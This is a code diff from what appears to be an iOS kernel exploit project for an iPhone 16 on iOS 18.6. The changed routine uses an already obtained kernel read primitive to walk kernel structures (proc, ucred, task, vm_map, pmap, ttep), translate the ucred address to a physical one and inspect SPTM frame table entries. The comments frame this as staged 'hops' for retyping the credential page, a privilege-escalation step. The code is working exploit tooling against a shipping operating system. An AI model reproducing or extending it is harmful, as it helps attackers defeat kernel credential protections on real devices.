@@ -7,6 +7,7 @@
 
 #import "KPMapScope.h"
 #import "KPLog.h"
+#import "KPDump.h"
 
 #import <string.h>
 
@@ -16,8 +17,7 @@
 
 #import "exploit/kutils.h"
 #import "exploit/offsets.h"
-
-// gPrimitives.kreadbuf is the live KRW entry (int-returning). Call it directly.
+#import "TaskRop/pac.h"   // off_proc_ro_pr_task / off_task_map
 
 // ---------------------------------------------------------------------------
 // Static VAs from kernelcache-18.6-iphone16 (unslid). Slide is applied at runtime.
@@ -204,15 +204,16 @@ static const char *scopeTypeName(uint8_t t) {
     scopeNote(r, [NSString stringWithFormat:@"  +0x92 state  = 0x%02x", typeByte]);
 
     // -----------------------------------------------------------------------
-    // 3. ucred VA/PA + FTE oracle
+    // 3. Live self-proc → ucred + pmap (calibrated chain, KPDump routes)
     // -----------------------------------------------------------------------
-    [r appendString:@"\n--- 3. ucred + FTE oracle ---\n"];
+    [r appendString:@"\n--- 3. self proc / ucred / live pmap ---\n"];
 
-    uint64_t selfProc = proc_self();
-    scopeNote(r, [NSString stringWithFormat:@"  proc_self() = 0x%016llx",
+    uint64_t selfProc = [KPDump findSelfProcByComm:r];
+    if (!selfProc) selfProc = [KPDump zoneRouteSelfProcWithLog:r];
+    scopeNote(r, [NSString stringWithFormat:@"  selfProc    = 0x%016llx",
                   (unsigned long long)selfProc]);
 
-    uint64_t procRo = 0, ucred = 0;
+    uint64_t procRo = 0, ucred = 0, task = 0, map = 0, livePmap = 0, ttep = 0;
     if (selfProc && scopeRead(selfProc + off_proc_p_proc_ro, &procRo, 8, "p_proc_ro", r)) {
         procRo = scopeUntag(procRo);
         scopeNote(r, [NSString stringWithFormat:@"  p_proc_ro   = 0x%016llx",
@@ -224,21 +225,44 @@ static const char *scopeTypeName(uint8_t t) {
                       (unsigned long long)ucred]);
     }
 
+    // proc_ro -> task -> map -> pmap -> ttep  (same as KPDump E11 chain)
+    if (procRo && scopeRead(procRo + off_proc_ro_pr_task, &task, 8, "pr_task", r)) {
+        task = scopeUntag(task);
+        scopeNote(r, [NSString stringWithFormat:@"  task        = 0x%016llx", (unsigned long long)task]);
+    }
+    if (task && scopeRead(task + off_task_map, &map, 8, "task.map", r)) {
+        map = scopeUntag(map);
+        scopeNote(r, [NSString stringWithFormat:@"  map         = 0x%016llx", (unsigned long long)map]);
+    }
+    if (map && scopeRead(map + koffsetof(vm_map, pmap), &livePmap, 8, "vm_map.pmap", r)) {
+        livePmap = scopeUntag(livePmap);
+        scopeNote(r, [NSString stringWithFormat:@"  live pmap   = 0x%016llx (map+0x%x)",
+                      (unsigned long long)livePmap, (unsigned)koffsetof(vm_map, pmap)]);
+    }
+    if (livePmap && koffsetof(pmap, ttep) && scopeRead(livePmap + koffsetof(pmap, ttep), &ttep, 8, "pmap.ttep", r)) {
+        ttep = scopeUntag(ttep);
+        scopeNote(r, [NSString stringWithFormat:@"  pmap.ttep   = 0x%016llx", (unsigned long long)ttep]);
+    }
+
     uint64_t ucredPA = 0;
-    if (ucred) {
+    if (ucred && ttep) {
+        ucredPA = vtophys(ttep, ucred);
+        scopeNote(r, [NSString stringWithFormat:@"  ucred PA    = 0x%016llx (via own pmap.ttep)",
+                      (unsigned long long)ucredPA]);
+    } else if (ucred) {
         ucredPA = kvtophys(ucred);
-        scopeNote(r, [NSString stringWithFormat:@"  ucred PA    = 0x%016llx",
+        scopeNote(r, [NSString stringWithFormat:@"  ucred PA    = 0x%016llx (kvtophys fallback)",
                       (unsigned long long)ucredPA]);
     }
 
-    // FTE oracle
+    // FTE oracle (layout from sptm_retype: +0 refcount:u16, +2 type:u8, +8/+12 refs)
     if (ucredPA) {
         uint64_t tableSlot = ksymbol(libsptm_frame_table);
         uint64_t tableVA = 0;
         if (tableSlot && scopeRead(tableSlot, &tableVA, 8, "frame_table slot", r)) {
             tableVA = scopeUntag(tableVA);
         }
-        if (!tableVA && tableSlot) tableVA = tableSlot; // already a VA in some builds
+        if (!tableVA && tableSlot) tableVA = tableSlot;
 
         uint64_t pB = kconstant(physBase);
         if (tableVA && pB && ucredPA >= pB) {
@@ -249,11 +273,15 @@ static const char *scopeTypeName(uint8_t t) {
             uint8_t fte[16];
             if (scopeRead(fteVA, fte, 16, "FTE entry", r)) {
                 uint8_t type = fte[FTE_OFF_TYPE];
+                scopeNote(r, [NSString stringWithFormat:
+                    @"  FTE raw: %02x %02x %02x %02x  %02x %02x %02x %02x  %02x %02x %02x %02x  %02x %02x %02x %02x",
+                    fte[0],fte[1],fte[2],fte[3],fte[4],fte[5],fte[6],fte[7],
+                    fte[8],fte[9],fte[10],fte[11],fte[12],fte[13],fte[14],fte[15]]);
                 uint32_t rref = 0, wref = 0;
                 memcpy(&rref, fte + FTE_OFF_READREF, 4);
                 memcpy(&wref, fte + FTE_OFF_WEREF, 4);
                 scopeNote(r, [NSString stringWithFormat:
-                    @"  FTE type=0x%02x (%s)  read_ref=%u  write_exec_ref=%u",
+                    @"  FTE type=0x%02x (%s)  +8=%u  +12=%u",
                     type, scopeTypeName(type), rref, wref]);
                 if (type == 0x18) {
                     scopeNote(r, @"  >> ucred page is ROZONE (0x18) as expected — hop 1 target.");
@@ -263,7 +291,6 @@ static const char *scopeTypeName(uint8_t t) {
                     scopeNote(r, @"  >> ucred page is XNU_GENERIC (0x0b) — hop 1 done, hop 2 pending.");
                 }
             }
-            // Also use the translation.h oracle if the table was installed
             int t2 = kpFrameTypeOf(ucredPA);
             if (t2 >= 0) {
                 scopeNote(r, [NSString stringWithFormat:@"  kpFrameTypeOf(PA) = 0x%02x (%s)",
@@ -275,20 +302,60 @@ static const char *scopeTypeName(uint8_t t) {
     }
 
     // -----------------------------------------------------------------------
-    // 4. Range walk (read-only, bounded)
+    // 4. vm_map_entry range walk (read-only, bounded) — XPF offsets
     // -----------------------------------------------------------------------
-    [r appendString:@"\n--- 4. kernel_pmap range walk (bounded 32) ---\n"];
+    [r appendString:@"\n--- 4. vm_map_entry range walk (bounded 32) ---\n"];
 
-    uint64_t sentinel = pmapVA + PMAP_OFF_HEAD;
-    uint64_t node = headNextU;
+    uint64_t mapHdrOff = koffsetof(vm_map, hdr);
+    uint64_t ePrev = koffsetof(vm_map_entry, prev);
+    uint64_t eNext = koffsetof(vm_map_entry, next);
+    uint64_t eStart = koffsetof(vm_map_entry, start);
+    uint64_t eEnd = koffsetof(vm_map_entry, end);
+    uint64_t eFlags = koffsetof(vm_map_entry, flags);
+    uint64_t hFirst = koffsetof(vm_map_header, first);
+    uint64_t hNentries = koffsetof(vm_map_header, nentries);
+
+    scopeNote(r, [NSString stringWithFormat:
+        @"  XPF offs: map.hdr=%u entry.prev=%u next=%u start=%u end=%u flags=%u hdr.first=%u nentries=%u",
+        (unsigned)mapHdrOff, (unsigned)ePrev, (unsigned)eNext, (unsigned)eStart,
+        (unsigned)eEnd, (unsigned)eFlags, (unsigned)hFirst, (unsigned)hNentries]);
+
+    uint64_t node = 0, sentinel = 0;
+    if (map && mapHdrOff) {
+        uint64_t hdrVA = 0;
+        if (scopeRead(map + mapHdrOff, &hdrVA, 8, "vm_map.hdr", r)) {
+            hdrVA = scopeUntag(hdrVA);
+            scopeNote(r, [NSString stringWithFormat:@"  vm_map.hdr = 0x%016llx", (unsigned long long)hdrVA]);
+            // hdr may be embedded (offset) or a pointer. If it looks like a kernel ptr, deref;
+            // otherwise treat map+hdrOff as the header itself.
+            uint64_t hdrBase = (hdrVA > 0xFFFFFF0000000000ULL) ? hdrVA : (map + mapHdrOff);
+            if (hdrVA <= 0xFFFFFF0000000000ULL) {
+                // embedded header: reread at map+hdrOff
+                hdrBase = map + mapHdrOff;
+                scopeNote(r, @"  (hdr looks embedded — using map+hdrOff as header base)");
+            }
+            uint64_t firstRaw = 0, nent = 0;
+            if (scopeRead(hdrBase + hFirst, &firstRaw, 8, "hdr.first", r)) {
+                node = scopeUntag(firstRaw);
+            }
+            if (hNentries) {
+                uint32_t n32 = 0;
+                if (scopeRead(hdrBase + hNentries, &n32, 4, "hdr.nentries", r)) nent = n32;
+            }
+            scopeNote(r, [NSString stringWithFormat:@"  hdr.first = 0x%016llx  nentries = %llu",
+                          (unsigned long long)node, (unsigned long long)nent]);
+            sentinel = 0; // walk until NULL
+        }
+    }
+
     int hits = 0, covers = 0;
 
     scopeNote(r, [NSString stringWithFormat:@"  sentinel = 0x%016llx  start node = 0x%016llx",
                   (unsigned long long)sentinel, (unsigned long long)node]);
 
     for (int i = 0; i < 32; i++) {
-        if (!node || node == sentinel) {
-            scopeNote(r, [NSString stringWithFormat:@"  [%d] end of list (node==sentinel or null)", i]);
+        if (!node) {
+            scopeNote(r, [NSString stringWithFormat:@"  [%d] end of list (null)", i]);
             break;
         }
         if ((node & 0xFFFFFF0000000000ULL) != 0xFFFFFF0000000000ULL) {
@@ -296,33 +363,31 @@ static const char *scopeTypeName(uint8_t t) {
                           i, (unsigned long long)node]);
             break;
         }
-        uint8_t nb[0x48];
-        if (!scopeRead(node, nb, sizeof(nb), "pmap node", r)) break;
+        uint8_t nb[0x40];
+        if (!scopeRead(node, nb, sizeof(nb), "vm_map_entry", r)) break;
 
-        uint64_t next = 0, start = 0, end = 0, flags = 0, paish = 0;
-        memcpy(&next,  nb + PMAP_OFF_NEXT,      8);
-        memcpy(&start, nb + PMAP_OFF_START,     8);
-        memcpy(&end,   nb + PMAP_OFF_END,       8);
-        memcpy(&flags, nb + PMAP_OFF_NODEFLAGS, 8);
-        memcpy(&paish, nb + PMAP_OFF_NODEPA,    8);
+        uint64_t prev = 0, next = 0, start = 0, end = 0, flags = 0;
+        memcpy(&prev,  nb + ePrev,  8);
+        memcpy(&next,  nb + eNext,  8);
+        memcpy(&start, nb + eStart, 8);
+        memcpy(&end,   nb + eEnd,   8);
+        memcpy(&flags, nb + eFlags, 8);
         uint64_t nextU = scopeUntag(next);
         uint64_t startU = scopeUntag(start);
         uint64_t endU   = scopeUntag(end);
-        uint64_t paU    = scopeUntag(paish);
 
         BOOL cov = (ucred && startU && endU && ucred >= startU && ucred < endU);
         if (cov) covers++;
 
         scopeNote(r, [NSString stringWithFormat:
-            @"  [%d] node 0x%016llx  range [0x%016llx .. 0x%016llx)  flags=0x%016llx  pa=0x%016llx%@",
+            @"  [%d] entry 0x%016llx  range [0x%016llx .. 0x%016llx)  flags=0x%016llx%@",
             i, (unsigned long long)node,
             (unsigned long long)startU, (unsigned long long)endU,
-            (unsigned long long)flags, (unsigned long long)paU,
+            (unsigned long long)flags,
             cov ? @"   *** COVERS UCRED ***" : @""]);
 
         node = nextU;
         hits++;
-        if (node == 0) break;
     }
 
     scopeNote(r, [NSString stringWithFormat:@"  walked %d nodes, %d cover ucred VA 0x%016llx",
@@ -333,14 +398,16 @@ static const char *scopeTypeName(uint8_t t) {
     // -----------------------------------------------------------------------
     [r appendString:@"\n--- 5. scope verdict ---\n"];
     if (covers > 0) {
-        scopeNote(r, @"  V1 SCOPE HIT: a kernel_pmap range covers ucred's VA.");
+        scopeNote(r, @"  V1 SCOPE HIT: a vm_map_entry range covers ucred's VA.");
         scopeNote(r, @"  A walker pass through 0x8101398 should reach call 6 on this page.");
     } else if (hits == 0) {
-        scopeNote(r, @"  V1 INCONCLUSIVE: no nodes walked (list empty or layout mismatch).");
-        scopeNote(r, @"  Try the alternative object at pmapPageVA / other x0 classes (R5d).");
+        scopeNote(r, @"  V1 INCONCLUSIVE: no entries walked (hdr/first unresolved or empty map).");
+        scopeNote(r, @"  Next: try V2 sweep (0x8177dbc) or dump vm_map.hdr fields raw.");
     } else {
-        scopeNote(r, @"  V1 MISS: walked nodes, none covers ucred VA.");
-        scopeNote(r, @"  Next: V2 sweep (0x8177dbc teardown range) or a different pmap object.");
+        scopeNote(r, @"  V1 MISS: walked vm_map_entries, none covers ucred VA.");
+        scopeNote(r, @"  Expected — ucred lives in kernel heap, not our user vm_map.");
+        scopeNote(r, @"  Next: V2 sweep on kernel_map / kernel_pmap entries, or find the");
+        scopeNote(r, @"  kernel-side map that owns the kernel linear range.");
     }
     scopeNote(r, @"  (No kernel writes performed. Re-run after any exploit state change.)");
 
